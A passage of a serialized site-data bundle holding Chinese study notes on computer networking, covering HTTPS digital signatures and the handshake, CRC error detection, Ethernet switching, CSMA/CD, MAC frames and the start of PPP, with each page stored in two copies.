8. 数字签名\n\n我们把证书内容生成一份“签名”，比对证书内容和签名是否一致就能察觉是否被篡改。这种技术就叫数字签名。 下图中左侧是数字签名的制作过程，右侧是验证过程\n\n\n\n数字签名的制作过程：\n\n 1. ca拥有非对称加密的私钥和公钥。\n 2. ca对证书明文信息进行hash。\n 3. 对hash后的值用私钥加密，得到数字签名。\n\n明文和数字签名共同组成了数字证书，这样一份数字证书就可以颁发给网站了。 那浏览器拿到服务器传来的数字证书后，如何验证它是不是真的？（有没有被篡改、掉包）\n\n浏览器验证过程：\n\n 1. 拿到证书，得到明文t1，数字签名s1。\n 2. 用ca机构的公钥对s1解密（由于是浏览器信任的机构，所以浏览器保有它的公钥。详情见下文），得到s2。\n 3. 用证书里说明的hash算法对明文t1进行hash得到t2。\n 4. 比较s2是否等于t2，等于则表明证书可信。\n\n为什么这样可以证明证书可信？ 假设中间人篡改了证书的原文，由于他没有ca机构的私钥，所以无法得到此时加密后签名，无法相应地篡改签名。浏览器收到该证书后会发现原文和签名解密后的值不一致，则说明证书已被篡改，证书不可信，从而终止向服务器传输信息，防止信息泄露给中间人。\n\n既然不可能篡改，那如果整个证书被掉包呢？ 假设有另一个网站b也拿到了ca机构认证的证书，它想搞垮网站a，想劫持网站a的信息。于是它成为中间人拦截到了a传给浏览器的证书，然后替换成自己的证书，传给浏览器，之后浏览器就会错误地拿到b的证书里的公钥了，会导致上文提到的漏洞。 其实这并不会发生，因为证书里包含了网站a的信息，包括域名，浏览器把证书里的域名与自己请求的域名比对一下就知道有没有被掉包了。\n\n制作数字签名时为什么需要hash一次？ 最显然的是性能问题，前面我们已经说了非对称加密效率较差，证书信息一般较长，比较耗时。而hash后得到的是固定长度的信息（比如用md5算法hash后可以得到固定的128位的值），这样加密解密就会快很多。当然除此之外也有安全上的原因。\n\nhttps必须在每次请求中都要先在ssl/tls层进行握手传输密钥吗？ 显然每次请求都经历一次密钥传输过程非常耗时，那怎么达到只传输一次呢？用session就可以。 服务器会为每个浏览器（或客户端软件）维护一个session id，在tsl握手阶段传给浏览器，浏览器生成好密钥传给服务器后，服务器会把该密钥存到相应的session id下，之后浏览器每次请求都会携带session id，服务器会根据session id找到相应的密钥并进行解密加密操作，这样就不必要每次重新制作、传输密钥了\n\n\n# 9. https 工作原理\n\n\n\n 1. client向server发送请求https://baidu.com，然后连接到server的443端口。\n\n 2. 服务端必须要有一套数字证书，可以自己制作，也可以向组织申请。区别就是自己颁发的证书需要客户端验证通过，才可以继续访问，而使用受信任的公司申请的证书则不会弹出提示页面，这套证书其实就是一对公钥和私钥。\n\n 3. 传送证书 这个证书其实就是公钥，只是包含了很多信息，如证书的颁发机构，过期时间、服务端的公钥，第三方证书认证机构(ca)的签名，服务端的域名信息等内容。\n\n 4. 客户端解析证书 这部分工作是由客户端的tls来完成的，首先会验证公钥是否有效，比如颁发机构，过期时间等等，如果发现异常，则会弹出一个警告框，提示证书存在问题。如果证书没有问题，那么就生成一个随机值（密钥）。然后用证书对该随机值进行加密。\n\n 5. 传送加密信息 这部分传送的是用证书加密后的密钥（随机值），目的就是让服务端得到这个密钥（随机值），以后客户端和服务端的通信就可以通过这个随机值来进行加密解密了。\n\n 6. 服务端加密信息 服务端用私钥解密，得到了客户端传过来的密钥（随机值），然后把内容通过该值进行对称加密。\n\n 7. 传输加密后的信息 这部分信息是服务端用密钥（随机值）对称加密后的信息，可以在客户端被还原。\n\n 8. 客户端解密信息 客户端用之前生成的密钥（随机值）解密服务端传过来的信息，于是获取了解密后的内容。",charsets:{cjk:!0},lastUpdated:"2022/04/19, 23:07:56",lastUpdatedTimestamp:1650380876e3},{title:"差错检测",frontmatter:{title:"差错检测",date:"2022-04-18T00:00:40.000Z",permalink:"/pages/85ca33/",categories:["网络","网络原理","数据链路层"],tags:[null],author:{name:"kehao",link:"https://github.com/chenkehao1998"}},regularPath:"/06.%E7%BD%91%E7%BB%9C/02.%E7%BD%91%E7%BB%9C%E5%8E%9F%E7%90%86/02.%E6%95%B0%E6%8D%AE%E9%93%BE%E8%B7%AF%E5%B1%82/03.%E5%B7%AE%E9%94%99%E6%A3%80%E6%B5%8B.html",relativePath:"06.网络/02.网络原理/02.数据链路层/03.差错检测.md",key:"v-08c570e3",path:"/pages/85ca33/",headersStr:null,content:" * 在传输过程中可能会产生比特差错： 1变成0或者0变成1。\n * 在一段时间内，传输错误的比特占所传输比特总数的比率 称为误码率BER 。\n * 为了保证数据传输的可靠性，在计算机网络传输数据时，必须采用各种差错检测措施。\n * 差错检测编码：纠错码和检错码\n\n在发送端：\n\n数据分成组，每一组k个bit,然后在后面加上n位冗余码\n\n> 例如：M=101001（k=6）,最后发送的时候数据长度为k+n\n> \n> 获得这n(事先已经确定了)位冗余码的方法：\n> \n> 1.先添加n个0，就变成了$2^n * M$=101001000\n> \n> 2.计算$2^n*M/P$（其中除数P也是事先确定了的，此处设为1101）\n> \n> \n> \n> 3.把余数R放到M的后面也就是$2^nM+R$，即101001001\n\n接收端：\n\n将这段数据除以P，看最后的余数\n\n * 若所得余数R＝0，则判定这个帧没有差错，就接受。\n * 若余数R≠0，则判定这个帧有差错，就丢弃。",normalizedContent:" * 在传输过程中可能会产生比特差错： 1变成0或者0变成1。\n * 在一段时间内，传输错误的比特占所传输比特总数的比率 称为误码率ber 。\n * 为了保证数据传输的可靠性，在计算机网络传输数据时，必须采用各种差错检测措施。\n * 差错检测编码：纠错码和检错码\n\n在发送端：\n\n数据分成组，每一组k个bit,然后在后面加上n位冗余码\n\n> 例如：m=101001（k=6）,最后发送的时候数据长度为k+n\n> \n> 获得这n(事先已经确定了)位冗余码的方法：\n> \n> 1.先添加n个0，就变成了$2^n * m$=101001000\n> \n> 2.计算$2^n*m/p$（其中除数p也是事先确定了的，此处设为1101）\n> \n> \n> \n> 3.把余数r放到m的后面也就是$2^nm+r$，即101001001\n\n接收端：\n\n将这段数据除以p，看最后的余数\n\n * 若所得余数r＝0，则判定这个帧没有差错，就接受。\n * 若余数r=0，则判定这个帧有差错，就丢弃。",charsets:{cjk:!0},lastUpdated:"2022/04/19, 23:07:56",lastUpdatedTimestamp:1650380876e3},{title:"局域网",frontmatter:{title:"局域网",date:"2022-04-18T00:00:40.000Z",permalink:"/pages/4c9634/",categories:["网络","网络原理","数据链路层"],tags:[null],author:{name:"kehao",link:"https://github.com/chenkehao1998"}},regularPath:"/06.%E7%BD%91%E7%BB%9C/02.%E7%BD%91%E7%BB%9C%E5%8E%9F%E7%90%86/02.%E6%95%B0%E6%8D%AE%E9%93%BE%E8%B7%AF%E5%B1%82/05.%E5%B1%80%E5%9F%9F%E7%BD%91.html",relativePath:"06.网络/02.网络原理/02.数据链路层/05.局域网.md",key:"v-70e8130e",path:"/pages/4c9634/",headers:[{level:2,title:"MAC",slug:"mac",normalizedTitle:"mac",charIndex:150},{level:2,title:"在物理层扩展以太网",slug:"在物理层扩展以太网",normalizedTitle:"在物理层扩展以太网",charIndex:175},{level:2,title:"在数据链路层扩展以太网",slug:"在数据链路层扩展以太网",normalizedTitle:"在数据链路层扩展以太网",charIndex:404}],headersStr:"MAC 在物理层扩展以太网 在数据链路层扩展以太网",content:"# 局域网的拓扑\n\n\n\n\n# 信道共享技术\n\n信道共享技术\n\n\n# 以太网\n\n * DIX Ethernet V2 是世界上第一个局域网产品（以太网）的规约，定义了以无源的电缆为总线的基带总线局域网。\n * IEEE 的 802.3 标准。\n\n> 这两个标准比较类似，一般情况下同等看待\n\n\n\n\n# MAC\n\nmac地址\n\n\n# 扩展以太网\n\n\n# 在物理层扩展以太网\n\n使用集线器扩展 使用多个集线器可连成更大的、 多级星形结构的以太网。\n\n\n\n原来的碰撞域是独立的，用集线器连接之后碰撞域就扩大了\n\n\n\n * 优点\n   \n   1. 使原来属于不同碰撞域的以太网上的计算机能够进行跨碰撞域的通信。\n   2. 扩大了以太网覆盖的地理范围。\n\n * 缺点\n   \n   1. 碰撞域增大了，但总的吞吐量并未提高。\n   2. 如果不同的碰撞域使用不同的数据率，那么就不能用集线器将它们互连起来。\n\n\n# 在数据链路层扩展以太网\n\n在数据链路层扩展以太网\n\n\n# CSMA/CD\n\nCSMA/CD",normalizedContent:"# 局域网的拓扑\n\n\n\n\n# 信道共享技术\n\n信道共享技术\n\n\n# 以太网\n\n * dix ethernet v2 是世界上第一个局域网产品（以太网）的规约，定义了以无源的电缆为总线的基带总线局域网。\n * ieee 的 802.3 标准。\n\n> 这两个标准比较类似，一般情况下同等看待\n\n\n\n\n# mac\n\nmac地址\n\n\n# 扩展以太网\n\n\n# 在物理层扩展以太网\n\n使用集线器扩展 使用多个集线器可连成更大的、 多级星形结构的以太网。\n\n\n\n原来的碰撞域是独立的，用集线器连接之后碰撞域就扩大了\n\n\n\n * 优点\n   \n   1. 使原来属于不同碰撞域的以太网上的计算机能够进行跨碰撞域的通信。\n   2. 扩大了以太网覆盖的地理范围。\n\n * 缺点\n   \n   1. 碰撞域增大了，但总的吞吐量并未提高。\n   2. 如果不同的碰撞域使用不同的数据率，那么就不能用集线器将它们互连起来。\n\n\n# 在数据链路层扩展以太网\n\n在数据链路层扩展以太网\n\n\n# csma/cd\n\ncsma/cd",charsets:{cjk:!0},lastUpdated:"2022/04/19, 23:07:56",lastUpdatedTimestamp:1650380876e3},{title:"透明传输",frontmatter:{title:"透明传输",date:"2022-04-18T00:00:40.000Z",permalink:"/pages/aca0b4/",categories:["网络","网络原理","数据链路层"],tags:[null],author:{name:"kehao",link:"https://github.com/chenkehao1998"}},regularPath:"/06.%E7%BD%91%E7%BB%9C/02.%E7%BD%91%E7%BB%9C%E5%8E%9F%E7%90%86/02.%E6%95%B0%E6%8D%AE%E9%93%BE%E8%B7%AF%E5%B1%82/04.%E9%80%8F%E6%98%8E%E4%BC%A0%E8%BE%93.html",relativePath:"06.网络/02.网络原理/02.数据链路层/04.透明传输.md",key:"v-1865401c",path:"/pages/aca0b4/",headersStr:null,content:" * 无论什么样的比特组合的数据都能够通过数据链路层进行传送。也可以说数据链路层对这些数据来说是透明的。\n * 字节填充或字符填充 ：发送端的数据链路层在数据中出现控制字符“SOH”或“EOT”的前面插入一个转义字符“ESC”。接收端的数据链路层在将数据送往网络层之前删除插入的转义字符。\n\n\n\n通过添加字符防止误判\n\n\n\n> 类似于c语言里面的输出字符'\\'的时候，需要用\\\\表示",normalizedContent:" * 无论什么样的比特组合的数据都能够通过数据链路层进行传送。也可以说数据链路层对这些数据来说是透明的。\n * 字节填充或字符填充 ：发送端的数据链路层在数据中出现控制字符“soh”或“eot”的前面插入一个转义字符“esc”。接收端的数据链路层在将数据送往网络层之前删除插入的转义字符。\n\n\n\n通过添加字符防止误判\n\n\n\n> 类似于c语言里面的输出字符'\\'的时候，需要用\\\\表示",charsets:{cjk:!0},lastUpdated:"2022/04/19, 23:07:56",lastUpdatedTimestamp:1650380876e3},{title:"信道共享技术",frontmatter:{title:"信道共享技术",date:"2022-04-18T00:00:40.000Z",permalink:"/pages/4dd8b9/",categories:["网络","网络原理","数据链路层"],tags:[null],author:{name:"kehao",link:"https://github.com/chenkehao1998"}},regularPath:"/06.%E7%BD%91%E7%BB%9C/02.%E7%BD%91%E7%BB%9C%E5%8E%9F%E7%90%86/02.%E6%95%B0%E6%8D%AE%E9%93%BE%E8%B7%AF%E5%B1%82/06.%E4%BF%A1%E9%81%93%E5%85%B1%E4%BA%AB%E6%8A%80%E6%9C%AF.html",relativePath:"06.网络/02.网络原理/02.数据链路层/06.信道共享技术.md",key:"v-26fe707a",path:"/pages/4dd8b9/",headers:[{level:2,title:"随机接入",slug:"随机接入",normalizedTitle:"随机接入",charIndex:86},{level:2,title:"受控接入",slug:"受控接入",normalizedTitle:"受控接入",charIndex:161},{level:3,title:"轮训系统",slug:"轮训系统",normalizedTitle:"轮训系统",charIndex:193},{level:3,title:"令牌环",slug:"令牌环",normalizedTitle:"令牌环",charIndex:226}],headersStr:"随机接入 受控接入 轮训系统 令牌环",content:"# 静态划分信道\n\n * 频分复用\n * 时分复用\n * 波分复用\n * 码分复用\n\n\n# 动态媒体接入控制（多点接入）：\n\n信道并非在用户通信时固定分配给用户。\n\n\n# 随机接入\n\n所有的用户可随机发送信息。如果恰巧有两个或更多的用户在同一时刻发送信息，那么在共享信道上就要产生碰撞，使得这些用户的发送都失败。\n\n\n# 受控接入\n\n用户不能随机发送信息而必须服从一定的控制。\n\n\n# 轮训系统\n\n工作原理：主站依次询问次站有无数据发送。\n\n\n\n\n# 令牌环\n\nA向D发送数据\n\n 1. A截获空令牌，封装成数据帧发送\n 2. B转发\n 3. C转发\n 4. D把此数据帧复制收下，原帧仍然转发\n 5. A收下此数据帧，还原出空令牌\n\n",normalizedContent:"# 静态划分信道\n\n * 频分复用\n * 时分复用\n * 波分复用\n * 码分复用\n\n\n# 动态媒体接入控制（多点接入）：\n\n信道并非在用户通信时固定分配给用户。\n\n\n# 随机接入\n\n所有的用户可随机发送信息。如果恰巧有两个或更多的用户在同一时刻发送信息，那么在共享信道上就要产生碰撞，使得这些用户的发送都失败。\n\n\n# 受控接入\n\n用户不能随机发送信息而必须服从一定的控制。\n\n\n# 轮训系统\n\n工作原理：主站依次询问次站有无数据发送。\n\n\n\n\n# 令牌环\n\na向d发送数据\n\n 1. a截获空令牌，封装成数据帧发送\n 2. b转发\n 3. c转发\n 4. d把此数据帧复制收下，原帧仍然转发\n 5. a收下此数据帧，还原出空令牌\n\n",charsets:{cjk:!0},lastUpdated:"2022/04/19, 23:07:56",lastUpdatedTimestamp:1650380876e3},{title:"在数据链路层扩展以太网",frontmatter:{title:"在数据链路层扩展以太网",date:"2022-04-18T00:00:40.000Z",permalink:"/pages/fbc441/",categories:["网络","网络原理","数据链路层"],tags:[null],author:{name:"kehao",link:"https://github.com/chenkehao1998"}},regularPath:"/06.%E7%BD%91%E7%BB%9C/02.%E7%BD%91%E7%BB%9C%E5%8E%9F%E7%90%86/02.%E6%95%B0%E6%8D%AE%E9%93%BE%E8%B7%AF%E5%B1%82/07.%E5%9C%A8%E6%95%B0%E6%8D%AE%E9%93%BE%E8%B7%AF%E5%B1%82%E6%89%A9%E5%B1%95%E4%BB%A5%E5%A4%AA%E7%BD%91.html",relativePath:"06.网络/02.网络原理/02.数据链路层/07.在数据链路层扩展以太网.md",key:"v-5264e68a",path:"/pages/fbc441/",headersStr:null,content:"使用以太网交换机\n\n\n# 1. 定义\n\n 1. 又称为交换式集线器。\n 2. 每个接口都直接与一个单台主机或另一个以太网交换机相连，并且一般都工作在全双工方式。\n 3. 以太网交换能同时连通多对接口，使多对主机独占传输媒体，无碰撞地传输数据。\n\n\n# 2. 优点\n\n 1. 即插即用\n 2. 使用了专用的交换结构芯片，用硬件转发，其转发速率要比使用软件转发的网桥快很多。\n 3. 从共享总线以太网转到交换式以太网时，所有接入设备的软件和硬件、适配器等都不需要做任何改动。\n 4. 一般都具有多种速率的接口，方便了各种不同情况的用户。\n\n\n# 3. 转发方式\n\n 1. 存储转发方式 把整个数据帧先缓存后再进行处理。\n    \n    > 缺点是速度慢\n\n 2. 直通转发方式 接收数据帧的同时就立即按数据帧的目的 MAC 地址决定该帧的转发接口，因而提高了帧的转发速度。\n    \n    > 缺点是不能差错检验\n\n\n# 4. 自学习功能\n\n以太网交换机运行自学习算法处理收到的帧和建立交换表\n\n\n\n自学习和转发帧的步骤\n\n 1. 交换机收到一帧后先进行自学习。 查找交换表中与收到帧的源地址有无相匹配的项目。如没有，就在交换表中增加一个项目（源地址、进入的接口和有效时间）。如有，则把原有的项目进行更新。\n\n 2. 转发帧。 查找交换表中与收到帧的目的地址有无相匹配的项目。\n    \n    1. 如没有， 则向所有其他接口（进入的接口除外）转发。\n    \n    2. 如有，则按交换表中给出的接口进行转发。\n       \n       若交换表中给出的接口就是该帧进入交换机的接口，则应丢弃这个帧（因为这时不需要经过交换机进行转发）。\n\n\n# 5. 生成树协议\n\n由来：为了在部分链路产生故障的时候依然可以正常使用，需要增加冗余\n\n增加冗余链路时， 自学习的过程就可能导致以太网帧在网络的某个环路中无限制地兜圈子 。\n\n\n\n为了解决这个问题IEEE 802.1D 标准制定了一个生成树协议 STP (SpanningTree Protocol)。\n\n其要点是： 不改变网络的实际拓扑，但在逻辑上则切断某些链路，使得从一台主机到所有其他主机的路径是无环路的树状结构，从而消除了兜圈子现象。",normalizedContent:"使用以太网交换机\n\n\n# 1. 定义\n\n 1. 又称为交换式集线器。\n 2. 每个接口都直接与一个单台主机或另一个以太网交换机相连，并且一般都工作在全双工方式。\n 3. 以太网交换能同时连通多对接口，使多对主机独占传输媒体，无碰撞地传输数据。\n\n\n# 2. 优点\n\n 1. 即插即用\n 2. 使用了专用的交换结构芯片，用硬件转发，其转发速率要比使用软件转发的网桥快很多。\n 3. 从共享总线以太网转到交换式以太网时，所有接入设备的软件和硬件、适配器等都不需要做任何改动。\n 4. 一般都具有多种速率的接口，方便了各种不同情况的用户。\n\n\n# 3. 转发方式\n\n 1. 存储转发方式 把整个数据帧先缓存后再进行处理。\n    \n    > 缺点是速度慢\n\n 2. 直通转发方式 接收数据帧的同时就立即按数据帧的目的 mac 地址决定该帧的转发接口，因而提高了帧的转发速度。\n    \n    > 缺点是不能差错检验\n\n\n# 4. 自学习功能\n\n以太网交换机运行自学习算法处理收到的帧和建立交换表\n\n\n\n自学习和转发帧的步骤\n\n 1. 交换机收到一帧后先进行自学习。 查找交换表中与收到帧的源地址有无相匹配的项目。如没有，就在交换表中增加一个项目（源地址、进入的接口和有效时间）。如有，则把原有的项目进行更新。\n\n 2. 转发帧。 查找交换表中与收到帧的目的地址有无相匹配的项目。\n    \n    1. 如没有， 则向所有其他接口（进入的接口除外）转发。\n    \n    2. 如有，则按交换表中给出的接口进行转发。\n       \n       若交换表中给出的接口就是该帧进入交换机的接口，则应丢弃这个帧（因为这时不需要经过交换机进行转发）。\n\n\n# 5. 生成树协议\n\n由来：为了在部分链路产生故障的时候依然可以正常使用，需要增加冗余\n\n增加冗余链路时， 自学习的过程就可能导致以太网帧在网络的某个环路中无限制地兜圈子 。\n\n\n\n为了解决这个问题ieee 802.1d 标准制定了一个生成树协议 stp (spanningtree protocol)。\n\n其要点是： 不改变网络的实际拓扑，但在逻辑上则切断某些链路，使得从一台主机到所有其他主机的路径是无环路的树状结构，从而消除了兜圈子现象。",charsets:{cjk:!0},lastUpdated:"2022/04/19, 23:07:56",lastUpdatedTimestamp:1650380876e3},{title:"CSMA_CD",frontmatter:{title:"CSMA_CD",date:"2022-04-18T00:00:40.000Z",permalink:"/pages/f32202/",categories:["网络","网络原理","数据链路层"],tags:[null],author:{name:"kehao",link:"https://github.com/chenkehao1998"}},regularPath:"/06.%E7%BD%91%E7%BB%9C/02.%E7%BD%91%E7%BB%9C%E5%8E%9F%E7%90%86/02.%E6%95%B0%E6%8D%AE%E9%93%BE%E8%B7%AF%E5%B1%82/08.CSMA_CD.html",relativePath:"06.网络/02.网络原理/02.数据链路层/08.CSMA_CD.md",key:"v-e168729c",path:"/pages/f32202/",headersStr:null,content:"载波监听多点接入/碰撞监测\n\n\n\n\n# 要点\n\n * 多点接入：表示许多计算机以多点接入的方式连接在一根总线上。\n * 载波监听：指每一个站在发送数据之前先要检测一下总线上是否有其他计算机在发送数据，如果有，则暂时不要发送数据，以免发生碰撞。\n * 碰撞检测：计算机边发送数据边检测信道上的是否有碰撞产生。通过检查总线上信号电压值的大小来实现。\n\n\n# 传播时延对载波监听的影响\n\n\n\n当发送数据的站一旦发现发生了碰撞\n\n 1. 立即停止发送数据\n 2. 再继续发送若干比特的人为干扰信号，以便让所有用户都知道现在已经发生了碰撞。\n\n\n# 特点\n\n 1. 使用 CSMA/CD 协议的以太网不能进行全双工通信而只能进行双向交替通信（半双工通信）。\n 2. 每个站在发送数据之后的一小段时间内，存在着遭遇碰撞的可能性。\n 3. 这种发送的不确定性使整个以太网的平均通信量远小于以太网的最高数据率。\n\n\n# 争用期（碰撞窗口）\n\n最先发送数据帧的站，在发送数据帧后至多经过时间（2τ）就可知道发送的数据帧是否遭受了碰撞。 以太网的端到端往返时延 2τ 称为争用期，或碰撞窗口。经过争用期这段时间还没有检测到碰撞，才能肯定这次发送不会发生碰撞。\n\n\n# 截断二进制指数退避算法\n\n发生碰撞的站在停止发送数据后，要推迟（退避）一个随机时间才能再发送数据。\n\n 1. 确定基本退避时间，一般是取为争用期 2τ。\n 2. 定义重传次数 k ， k ≤ 10，即k = Min[重传次数, 10]\n 3. 从整数集合[0,1,…, (2^k^ -1)]中随机地取出一个数，记为 r。重传所需的时延就是 r 倍的基本退避时间。\n 4. 当重传达 16 次仍不能成功时即丢弃该帧，并向高层 报告\n\n作用：\n\n 1. 减小重传时再次发生碰撞的概率。\n 2. 若连续多次发生冲突，则表明可能有较多的站参与争用信道。使用退避算法可使重传需要推迟的平均时间随重传次数而增大（也称为动态退避），因而减小发生碰撞的概率，有利于整个系统的稳定。\n\n\n# 以太网(10M)的指标\n\n争用期的长度： 51.2 µs\n\n最短有效帧长： 64 字节\n\n> 如果发生碰撞，就一定是在发送的前 64 字节之内。由于一检测 到碰撞就立即中止发送，这时已经发送出去的数据一定小于 64 字节。 所以以太网规定了最短有效帧长为 64 字节，凡长度小于 64 字节的 帧都是由于碰撞而异常中止的无效帧。\n\n帧间最小间隔： 9.6 µs\n\n> 一个站在检测到总线开始空闲后，还要等待 9.6 µs 才能再次发送数据\n> \n> 为了处理刚接收到的帧\n\n\n# 要求最短帧的原因\n\n> 因为，结点检测是否发生碰撞是根据信号电压来判断，但是并不知道是哪个帧发生了碰撞，为了让数据包发生碰撞的时候能够之后重传，必须让发送方知道自己发送的帧发生了碰撞\n> \n> 所以应该让这个帧足够长，以至于在这个帧到达终点之前，不能完成发送，即发送数据的帧检测到碰撞的时候，正在发送数据，这个时候，它就知道它在发送的这一帧是失效的，之后就可以重发\n> \n> 引用谢希仁的网络原理上的一段话\n> \n> > ",normalizedContent:"载波监听多点接入/碰撞监测\n\n\n\n\n# 要点\n\n * 多点接入：表示许多计算机以多点接入的方式连接在一根总线上。\n * 载波监听：指每一个站在发送数据之前先要检测一下总线上是否有其他计算机在发送数据，如果有，则暂时不要发送数据，以免发生碰撞。\n * 碰撞检测：计算机边发送数据边检测信道上的是否有碰撞产生。通过检查总线上信号电压值的大小来实现。\n\n\n# 传播时延对载波监听的影响\n\n\n\n当发送数据的站一旦发现发生了碰撞\n\n 1. 立即停止发送数据\n 2. 再继续发送若干比特的人为干扰信号，以便让所有用户都知道现在已经发生了碰撞。\n\n\n# 特点\n\n 1. 使用 csma/cd 协议的以太网不能进行全双工通信而只能进行双向交替通信（半双工通信）。\n 2. 每个站在发送数据之后的一小段时间内，存在着遭遇碰撞的可能性。\n 3. 这种发送的不确定性使整个以太网的平均通信量远小于以太网的最高数据率。\n\n\n# 争用期（碰撞窗口）\n\n最先发送数据帧的站，在发送数据帧后至多经过时间（2τ）就可知道发送的数据帧是否遭受了碰撞。 以太网的端到端往返时延 2τ 称为争用期，或碰撞窗口。经过争用期这段时间还没有检测到碰撞，才能肯定这次发送不会发生碰撞。\n\n\n# 截断二进制指数退避算法\n\n发生碰撞的站在停止发送数据后，要推迟（退避）一个随机时间才能再发送数据。\n\n 1. 确定基本退避时间，一般是取为争用期 2τ。\n 2. 定义重传次数 k ， k ≤ 10，即k = min[重传次数, 10]\n 3. 从整数集合[0,1,…, (2^k^ -1)]中随机地取出一个数，记为 r。重传所需的时延就是 r 倍的基本退避时间。\n 4. 当重传达 16 次仍不能成功时即丢弃该帧，并向高层 报告\n\n作用：\n\n 1. 减小重传时再次发生碰撞的概率。\n 2. 若连续多次发生冲突，则表明可能有较多的站参与争用信道。使用退避算法可使重传需要推迟的平均时间随重传次数而增大（也称为动态退避），因而减小发生碰撞的概率，有利于整个系统的稳定。\n\n\n# 以太网(10m)的指标\n\n争用期的长度： 51.2 µs\n\n最短有效帧长： 64 字节\n\n> 如果发生碰撞，就一定是在发送的前 64 字节之内。由于一检测 到碰撞就立即中止发送，这时已经发送出去的数据一定小于 64 字节。 所以以太网规定了最短有效帧长为 64 字节，凡长度小于 64 字节的 帧都是由于碰撞而异常中止的无效帧。\n\n帧间最小间隔： 9.6 µs\n\n> 一个站在检测到总线开始空闲后，还要等待 9.6 µs 才能再次发送数据\n> \n> 为了处理刚接收到的帧\n\n\n# 要求最短帧的原因\n\n> 因为，结点检测是否发生碰撞是根据信号电压来判断，但是并不知道是哪个帧发生了碰撞，为了让数据包发生碰撞的时候能够之后重传，必须让发送方知道自己发送的帧发生了碰撞\n> \n> 所以应该让这个帧足够长，以至于在这个帧到达终点之前，不能完成发送，即发送数据的帧检测到碰撞的时候，正在发送数据，这个时候，它就知道它在发送的这一帧是失效的，之后就可以重发\n> \n> 引用谢希仁的网络原理上的一段话\n> \n> > ",charsets:{cjk:!0},lastUpdated:"2022/04/19, 23:07:56",lastUpdatedTimestamp:1650380876e3},{title:"mac地址",frontmatter:{title:"mac地址",date:"2022-04-18T00:00:40.000Z",permalink:"/pages/5bdc4d/",categories:["网络","网络原理","数据链路层"],tags:[null],author:{name:"kehao",link:"https://github.com/chenkehao1998"}},regularPath:"/06.%E7%BD%91%E7%BB%9C/02.%E7%BD%91%E7%BB%9C%E5%8E%9F%E7%90%86/02.%E6%95%B0%E6%8D%AE%E9%93%BE%E8%B7%AF%E5%B1%82/09.mac%E5%9C%B0%E5%9D%80.html",relativePath:"06.网络/02.网络原理/02.数据链路层/09.mac地址.md",key:"v-268dbece",path:"/pages/5bdc4d/",headersStr:null,content:" 1. IEEE 802标准为局域网规定了48位的全球地址，指局域网上的每一台计算机中固化在适配器的ROM中的地址。\n\n 2. IEEE 的注册管理机构 RA 负责向厂家分配地址字段的前三个字节(即高位 24 位)。地址字段中的后三个字节(即低位 24位)由厂家自行指派。\n\n 3. 当收到mac帧时\n    \n    1. 如果是发往本站的帧则收下，然后再进行其他的处理。\n    2. 否则就将此帧丢弃，不再进行其他的处理。\n\n 4. “发往本站的帧”包括以下三种帧：\n    \n    1. 单播帧：一方发送，一方接收\n    2. 广播帧：一方发送，全体接收\n    3. 多播帧：一方发送，多个成员接收\n\n 5. MAC帧的格式\n    \n    \n    \n    > 类型字段用来标志上一层使用的是什么协议，以便把收到的 MAC 帧的数据上交给上一层的这个协议 ，在802.3中也可以表示长度\n    > \n    > 数据部分是上一层传下来的ip数据报\n    > \n    > 46个字节的最短长度是因为以太网CSMA/CD规定的最短帧长为64字节，去掉首部（6+6+2=14）和尾部（4），剩下46，如果数据长度不够46个字节会填充若干个字节凑够\n    > \n    > ppp协议中有帧的首部和尾部中都会有标志字段，标志帧的开始和结束，在mac协议中是采用了在前面添加前同步码的方式来标志帧的开始，但是接收方是不会接收他们的\n    > \n    > 在帧的前面插入的 8 字节中的第一个字段共 7 个字节， 是前同步码，用来迅速实现 MAC 帧的比特同步。 第二个字段是帧开始定界符，表示后面的信息就是MAC 帧。\n\n 6. 无效的MAC帧\n    \n    1. 数据字段的长度与长度字段的值不一致；\n    2. 帧的长度不是整数个字节；\n    3. 用收到的帧检验序列 FCS 查出有差错；\n    4. 数据字段的长度不在 46 ~ 1500 字节之间。\n    \n    对于检查出的无效 MAC 帧就简单地丢弃。以太网不负责重传丢弃的帧。由传输层负责",normalizedContent:" 1. ieee 802标准为局域网规定了48位的全球地址，指局域网上的每一台计算机中固化在适配器的rom中的地址。\n\n 2. ieee 的注册管理机构 ra 负责向厂家分配地址字段的前三个字节(即高位 24 位)。地址字段中的后三个字节(即低位 24位)由厂家自行指派。\n\n 3. 当收到mac帧时\n    \n    1. 如果是发往本站的帧则收下，然后再进行其他的处理。\n    2. 否则就将此帧丢弃，不再进行其他的处理。\n\n 4. “发往本站的帧”包括以下三种帧：\n    \n    1. 单播帧：一方发送，一方接收\n    2. 广播帧：一方发送，全体接收\n    3. 多播帧：一方发送，多个成员接收\n\n 5. mac帧的格式\n    \n    \n    \n    > 类型字段用来标志上一层使用的是什么协议，以便把收到的 mac 帧的数据上交给上一层的这个协议 ，在802.3中也可以表示长度\n    > \n    > 数据部分是上一层传下来的ip数据报\n    > \n    > 46个字节的最短长度是因为以太网csma/cd规定的最短帧长为64字节，去掉首部（6+6+2=14）和尾部（4），剩下46，如果数据长度不够46个字节会填充若干个字节凑够\n    > \n    > ppp协议中有帧的首部和尾部中都会有标志字段，标志帧的开始和结束，在mac协议中是采用了在前面添加前同步码的方式来标志帧的开始，但是接收方是不会接收他们的\n    > \n    > 在帧的前面插入的 8 字节中的第一个字段共 7 个字节， 是前同步码，用来迅速实现 mac 帧的比特同步。 第二个字段是帧开始定界符，表示后面的信息就是mac 帧。\n\n 6. 无效的mac帧\n    \n    1. 数据字段的长度与长度字段的值不一致；\n    2. 帧的长度不是整数个字节；\n    3. 用收到的帧检验序列 fcs 查出有差错；\n    4. 数据字段的长度不在 46 ~ 1500 字节之间。\n    \n    对于检查出的无效 mac 帧就简单地丢弃。以太网不负责重传丢弃的帧。由传输层负责",charsets:{cjk:!0},lastUpdated:"2022/04/19, 23:07:56",lastUpdatedTimestamp:1650380876e3},{title:"ppp协议",frontmatter:{title:"ppp协议",date:"2022-04-18T00:00:40.000Z",permalink:"/pages/b365d3/",categories:["网络","网络原理","数据链路层"],tags:[null],author:{name:"kehao",link:"https://github.com/chenkehao1998"}},regularPath:"/06.%E7%BD%91%E7%BB%9C/02.%E7%BD%91%E7%BB%9C%E5%8E%9F%E7%90%86/02.%E6%95%B0%E6%8D%AE%E9%93%BE%E8%B7%AF%E5%B1%82/10.ppp%E5%8D%8F%E8%AE%AE.html",relativePath:"06.网络/02.网络原理/02.数据链路层/10.ppp协议.md",key:"v-98022a60",path:"/pages/b365d3/",headersStr:null,content:" * 点对点协议 PPP (Point-to-Point 